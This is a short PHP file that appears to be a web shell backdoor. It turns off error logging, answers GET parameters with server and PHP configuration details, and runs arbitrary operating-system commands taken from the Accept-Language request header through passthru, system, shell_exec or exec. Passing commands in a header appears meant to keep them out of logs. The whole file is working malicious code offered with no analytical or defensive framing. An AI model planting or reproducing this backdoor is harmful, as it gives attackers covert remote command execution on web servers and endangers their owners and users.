<?php set_time_limit(0);error_reporting(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('output_buffering',0);if(isset($_GET['disable_functions'])){echo(!empty(ini_get('disable_functions'))?ini_get('disable_functions'):'NONE');die();}if(isset($_GET['unamea'])){echo php_uname('a');die();}if(isset($_GET['server'])){$server_software=(!empty(getenv('SERVER_SOFTWARE')))?getenv('SERVER_SOFTWARE'):'';echo $server_software;die();}if(isset($_GET['safe_mode'])){$safe_mode=(ini_get('safe_mode')==1)?'ON':'OFF';echo $safe_mode;die();}if(isset($_GET['server_ip'])){$server_ip=(!empty(getenv('SERVER_ADDR')))?getenv('SERVER_ADDR'):'';echo $server_ip;die();}if(isset($_GET['client_ip'])){$client_ip=(!empty(getenv('REMOTE_ADDR')))?getenv('REMOTE_ADDR'):'';echo $client_ip;die();}if($_GET['cmd']=="passthru"){passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']);}elseif($_GET['cmd']=="system"){system($_SERVER['HTTP_ACCEPT_LANGUAGE']);}elseif($_GET['cmd']=="shell_exec"){echo shell_exec($_SERVER['HTTP_ACCEPT_LANGUAGE']);}elseif($_GET['cmd']=="exec"){echo exec($_SERVER['HTTP_ACCEPT_LANGUAGE']);}